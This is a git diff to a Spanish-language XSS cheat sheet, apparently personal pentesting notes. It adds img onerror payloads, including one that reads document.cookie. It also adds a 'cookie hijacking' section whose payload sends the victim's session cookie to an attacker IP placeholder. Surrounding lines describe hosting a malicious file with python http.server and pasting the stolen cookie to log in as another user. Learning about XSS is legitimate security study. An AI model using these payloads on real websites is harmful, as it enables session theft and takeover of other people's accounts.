@@ -24,15 +24,17 @@ Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en dond
 ## HTML
 
 ```javascript
-<h1>Hola</h1>                                                              /// Podemos hacer inyecciones con codigo HTML
-<marquee>Hola</marquee>                                                    /// Podemos usar marquee para que el texto nos salga animado, de izquierda a derecha 
+<h1>Hola</h1>                                                          /// Podemos hacer inyecciones con codigo HTML
+<marquee>Hola</marquee>                                                /// Podemos usar marquee para que el texto nos salga animado, de izquierda a derecha 
 
-<a href="https://www.ionos.mx/digitalguide/URL">Texto ancla</a>            /// Para colocar un enlace 
+<a href="https://www.ionos.mx/digitalguide/URL">Texto ancla</a>        /// Para colocar un enlace 
 
-<img src="images/imagen.png">                                              /// Para agregar una imagen
+<img src="images/imagen.png">                                          /// Para agregar una imagen
 <img src="https://test.com/images/imagen.png">
 
-<img src="X" onerror=alert(1) />                                                     /// Para colocar un alert basado en un error 
+<img src="X" onerror=alert(1) />                                       /// Para colocar un alert basado en un error 
+<img src/onerror=alert(1) />                                           /// Otra forma de hacerlo
+<img src/onerror=alert(document.cookie) />                             /// Mirar la cookie
 
 <iframe src="http://ejemplo.org/demo.html" height="400" width="800" name="demo">     /// Para agregar una pagina dentro de otra pagina con dimenciones 
   <p>Su navegador no es compatible con iframes</p>
@@ -164,6 +166,15 @@ External JavaScript Source, podemos cargar código desde un servidor externo par
 ❯ python3 -m http.server 80               # Nos montamos un servidor http 80 para que la victima acceda al archivo malicioso 
 
 # Después de tener la 'Cookie de Session' podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y así cuando recarguemos la pagina, iniciaremos como el otro usuario.
+```
+
+## Otra forma de Cookie Hijacking 
+```java 
+// Otra forma de mandar un script por medio de la url para robar la cookie de sesion es con la etiqueta img, cuando en la etiqueta 'HTML' no encuentre el recurso (imagen) ejecutara la parte del error. Esto es funcional cuando prohiben las etiquetas 'Javascript'
+
+<img src=x onerror=this.src='http://IP//c='%2Bdocument.cookie>
+	// IP = La direccion IP del atacante 
+
 ```
 
 ## Victima cree un post en una web 
